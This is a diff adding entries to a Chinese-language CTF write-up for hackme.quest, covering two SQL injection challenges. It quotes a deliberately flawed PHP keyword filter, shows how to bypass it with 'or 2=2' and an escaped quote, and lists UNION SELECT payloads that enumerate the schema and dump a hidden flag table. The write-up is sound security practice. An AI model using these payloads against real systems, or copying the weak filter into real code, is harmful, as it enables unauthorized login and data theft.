@@ -53,6 +53,59 @@ https://ctf.hackme.quest/lfi/?page=php://filter//read=convert.base64-encode/reso
 ## 20 scoreboard
 F12後換到網路，打開scoreboard的標頭，可以發現flag藏在x-flag裡
 
+## 21 login as admin 0
+要使用sql injection來做登入的動作，可以先看一下網頁原始碼
+``` php=
+function safe_filter($str)
+{
+    $strl = strtolower($str);
+    if (strstr($strl, 'or 1=1') || strstr($strl, 'drop') ||
+        strstr($strl, 'update') || strstr($strl, 'delete')
+    ) {
+        return '';
+    }
+    return str_replace("'", "\\'", $str);
+}
+
+$_POST = array_map(safe_filter, $_POST);
+```
+
+他會把常使用到的 or 1=1給擋掉， 因此可把恆正表示改為 or 2=2
+
+除此之外，他也會把" ' "給替換為" \\\\' "，此處可改為輸入" \\' "來繞開這個檢測
+
+嘗試輸入 "\\' or 2=2#"，結果發現依舊是以guest身分登入
+
+加上 order by user嘗試改變return的資料順序後就發現是以admin登入了
+
+## 22 login as admin 0.1
+和上一題是同樣的網站，但是要找到藏在資料庫裡的flag
+
+找到query的列數與會回顯的列
+
+```admin\' union select 1,2,3,4 #```
+
+發現2會回顯
+
+找到資料庫的名稱為"login_as_admin0"
+
+```admin\' union select 1,(SELECT database()),3,4 #```
+
+找到table的名稱為"h1dden_f14g"
+
+```admin\' union select 1,group_concat(TABLE_NAME),3,4 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA="login_as_admin0"#```
+
+
+找到column的名稱 "the_f14g"
+
+```admin\' union select 1,group_concat(COLUMN_NAME),3,4 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME="h1dden_f14g"#```
+
+找到flag~~
+
+```admin\' union select 1,group_concat(the_f14g),3,4 FROM h1dden_f14g#```
+
+
+
 
 # Pwn
 ## 57 catflag
